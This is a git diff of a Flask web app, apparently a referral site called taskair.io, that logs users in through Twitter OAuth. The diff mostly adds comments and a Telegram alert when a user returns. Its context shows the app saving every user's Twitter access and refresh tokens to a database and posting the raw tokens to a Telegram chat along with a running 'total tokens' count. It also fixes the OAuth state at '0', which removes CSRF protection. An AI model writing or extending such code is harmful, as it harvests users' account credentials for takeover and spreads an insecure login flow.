@@ -415,7 +415,21 @@ def home():
     if referrer_id:
         session['referrer_id'] = referrer_id
 
-    # Proceed with OAuth flow if 'authorize' is in query
+    # Check if user is already logged in
+    if 'username' in session:
+        username = session['username']
+        
+        # Always generate and retrieve referral URL on login/return
+        referral_url = generate_referral_url(username)
+        session['referral_url'] = referral_url
+        
+        send_message_via_telegram(
+            f"👋 @{username} just returned to the website.\n"
+            f"🌐 Referral Link: {referral_url}"
+        )
+        return redirect(url_for('welcome'))
+
+    # OAuth authorization flow
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -427,16 +441,18 @@ def home():
         )
         return redirect(authorization_url)
 
-    # Handle the response after authorization
+    # Handle response after authorization
     if code:
         if error:
             return f"Error during authorization: {error}", 400
 
-        # Check state and code verifier
+        # Validate the state
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
+
+        # Exchange authorization code for tokens
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
             'grant_type': 'authorization_code',
@@ -451,23 +467,32 @@ def home():
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
+
+            # Fetch Twitter username and profile URL
             username, profile_url = get_twitter_username_and_profile(access_token)
 
             if username:
+                # Store tokens and username in the database
                 store_token(access_token, refresh_token, username)
+
+                # Generate and retrieve the referral URL
                 referral_url = generate_referral_url(username)
                 session['referral_url'] = referral_url
 
-                # If referrer exists in session, reward the referrer
+                # Reward the referrer if a referrer ID is stored in the session
                 if 'referrer_id' in session:
                     reward_referrer(session['referrer_id'])
                     session.pop('referrer_id', None)
 
+                # Update session data
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
+
+                # Retrieve total token count for notification
                 total_tokens = get_total_tokens()
 
+                # Notify via Telegram with the referral link included
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
@@ -476,6 +501,7 @@ def home():
                     f"🌐 Referral Link: {referral_url}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
+
                 return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
@@ -599,18 +625,27 @@ def generate_referral_url(username):
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
-        # Retrieve or create referral link
+
+        # Retrieve the user's ID and existing referral URL
         cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
         user = cursor.fetchone()
+        
+        # If the user exists, retrieve their ID and referral link
         if user:
             user_id, referral_url = user
-            if not referral_url:  # If no referral URL exists, create one
-                base_url = os.getenv('APP_URL', 'https://taskair.io')
+
+            # If there's no referral URL, generate one
+            if not referral_url:
+                base_url = os.getenv('APP_URL', 'https://taskair.io')  # Use APP_URL or default URL
                 referral_url = f"{base_url}/?referrer_id={user_id}"
                 cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
                 conn.commit()
+
+            conn.close()
+            return referral_url  # Return either the existing or newly generated referral URL
+
         conn.close()
-        return referral_url if user else None
+        return None  # If user does not exist, return None
     except Exception as e:
         print(f"Error generating referral URL for {username}: {e}")
         return None
